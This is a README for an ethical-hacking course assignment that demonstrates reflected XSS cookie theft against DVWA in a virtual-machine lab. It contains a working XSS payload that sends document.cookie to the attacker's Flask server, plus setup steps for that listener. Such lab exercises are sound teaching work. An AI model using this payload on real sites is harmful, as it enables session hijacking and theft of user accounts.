# Cookie-Stealer

Q2 – Cookie Stealer (CSCI369 Ethical Hacking Assignment)

Description:
-------------
This project demonstrates a reflected XSS attack to steal a session cookie from a vulnerable web application (DVWA) and send it to a Flask server running on the attacker machine (Kali Linux). The stolen cookie is saved with a timestamp into a file called cookies.txt.

Environment Setup:
--------------------
Attacker: Kali Linux (IP: 10.0.2.15)
Victim: Meta2 VM (IP: 10.0.2.4)
Target Web App: DVWA (Damn Vulnerable Web App), accessible at http://10.0.2.4/dvwa

All VMs should be on the same NAT network and able to ping each other.

Files in this folder:
----------------------
1. stealer.py         - Python Flask web server that logs stolen cookies
2. xss_payload.txt    - JavaScript payload used for the XSS injection
3. README.txt         - This file (setup guide and explanation)

Instructions:
----------------
1. Set up Flask server on Kali:
   - Open terminal:
     sudo apt update
     sudo apt install python3-venv -y
   - Set up project folder:
     mkdir ~/myproject
     cd ~/myproject
     python3 -m venv venv
     source venv/bin/activate
     pip install Flask
   - Save stealer.py in this folder
   - Run the server:
     python3 stealer.py

2. Access DVWA from Kali browser:
   - Visit: http://10.0.2.4/dvwa
   - Login with: admin / password
   - Go to: DVWA Security → Set to "Medium"
   - Navigate to: XSS (Reflected)

3. Inject the XSS payload into the "What’s your name?" field:
   <img src=x onerror="new Image().src='http://10.0.2.15:8080/?cookie='+document.cookie;">

   (This payload is also saved in xss_payload.txt)

4. After clicking "Submit", the script will run silently in the browser and send the cookie to your Flask server.

5. In Kali terminal, check if the cookie was received:
   cd ~/myproject
   cat cookies.txt

   You should see a line like:
   [2025-07-25 18:43:01] Cookie: PHPSESSID=xyz123; security=medium

How it works:
----------------
- The attacker injects a JavaScript payload into a vulnerable input field.
- When DVWA reflects the input and the page loads, the browser runs the script.
- The script extracts document.cookie and sends it via an HTTP GET request to the attacker's Flask server.
- The Flask server writes the stolen cookie into cookies.txt with a timestamp.

Disclaimer:
--------------
This project is for academic and ethical hacking purposes only. Do not use these techniques on real systems without permission. Unauthorized hacking is illegal.

Assignment Requirements Covered:
-----------------------------------
- Flask app to receive and log cookies ✔
- Timestamp using datetime module ✔
- Final XSS payload in text file ✔
- Tested on DVWA with "Medium" security ✔
